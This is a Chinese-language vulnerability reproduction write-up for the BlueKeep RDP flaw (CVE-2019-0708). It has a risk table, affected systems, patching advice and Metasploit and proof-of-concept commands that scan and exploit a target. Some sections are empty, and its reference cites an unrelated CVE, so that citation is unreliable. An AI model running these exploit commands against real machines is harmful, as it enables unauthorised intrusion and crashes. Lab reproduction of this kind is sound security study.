# 标题

[TOC]

# 1. 概述

2019年5月14日，微软发布了针对远程桌面服务的关键远程执行代码漏洞CVE-2019-0708的补丁，该漏洞影响某些旧版本的windows。攻击者一旦成功触发该漏洞，便可以在目标系统上执行任意代码，该漏洞的触发无需任何用户交互操作。这意味着，存在漏洞的计算机只要联网，无需任何操作，就可能遭遇黑客远程攻击，运行恶意代码。其方式与2017年的 WannaCry恶意软件的传播方式类似.成功利用此漏洞的攻击者可以在目标系统完成安装应用程序，查看、更改或删除数据，创建完全访问权限的新账户等操作。

CVE-2019-0708漏洞利用方式是通过远程桌面端口3389，RDP协议进行攻击。该漏洞是通过检查用户的身份认证，导致可以绕过认证，不用任何的交互，直接通过rdp协议进行连接发送恶意代码执行命令到服务器中去。如果被攻击者利用，会导致服务器入侵，中病毒，像WannaCry 永恒之蓝漏洞一样大规模的感染。
若要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送经特殊设计的请求。



## 1.1 


## 1.2 漏洞简述



## 1.3 风险等级

|  评定方式   | 等级  |
|  ----  | ----  |
| CVSS Score | 9.3 |
| Confidentiality Impact  | Complete |
| Integrity Impact  | Complete |
| Availability Impact  | Complete |
| 实现难度  | 中等 |
| 基础权限  | 不需要 |
| 漏洞类型  | 缓存区溢出 |

![cvss](img/cvss.png)

## 1.4 影响范围

**Window 7**

**Window Server 2003 SP2**

**Window Server 2008 SP1/2**

**Window Vista SP2**

**Window Xp SP2/3**

## 1.5 漏洞详情

[漏洞原理](https://www.anquanke.com/post/id/181577)

# 2. 环境配置

## 2.1 方案一

## 2.2 方案二

## 2.3 访问测试


# 3. 漏洞复现


## 3.1 准备工作

1. rpd
```
.\0708detector.exe -t 192.168.0.114(目标ip) -p 3389

```

2. msf
```
sudo msfconsole
search 0708  //搜索0708漏洞的路径位置
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep  //进入扫描模块
set rhosts 192.168.0.114 (目标ip)  //设置目标IP
show options
run          //直接运行
```

### 准备Payload




## 3.2 漏洞利用

1. exp
```
git clone https://github.com/n1xbyte/CVE-2019-0708.git
cd CVE-2019-0708
ls
chmod +x crashpoc.py  //覆一个执行权限
python3 crashpoc.py 192.168.0.114 64
```
2. msf
``` 
search 0708
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set rhosts 192.168.0.114 (目标ip)
show targets   //查看目标
set target 5   //我选择5，一般选择4和5，具体选择看实际情况
show options
exploit   //攻击
```


# 4. 修复建议

1. 升级系统或下载安装[补丁](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708),同时针对已不受微软更新支持的系统Windows Server 2003和Windows XP提供的[安全更新](https://support.microsoft.com/zh-cn/help/4500705/customer-guidance-for-cve-2019-0708)

2.在受影响版本的系统上启用网络级身份验证（NLA）；启用NLA后，攻击者需要使用目标系统上的有效账户对远程桌面服务进行身份验证，才能成功利用该漏洞,此方案适用于Windows 7, Windows Server 2008, Windows Server 2008 R2

3. 关闭3389端口或添加相应防火墙安全策略限制对3389端口的访问,若用户不需要用到远程桌面服务，建议禁用该服务。

4.安全设备

# 5. 总结

当未经身份验证的攻击者使用 RDP 连接到目标系统并发送特制请求时，远程桌面服务（以前称为终端服务）中存在远程代码执行漏洞。此漏洞是预身份验证，不需要用户交互。成功利用此漏洞的攻击者可以在目标系统上执行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新帐户。
要利用此漏洞，攻击者需要通过 RDP 向目标系统远程桌面服务发送特制请求。
此更新通过更正远程桌面服务处理连接请求的方式来解决该漏洞。

# 6. References

CVE Details (2020) _CVE-2020-9496_. Available at: https://www.cvedetails.com/cve/CVE-2020-9496/...(Accessed: 22 Sept 2022).

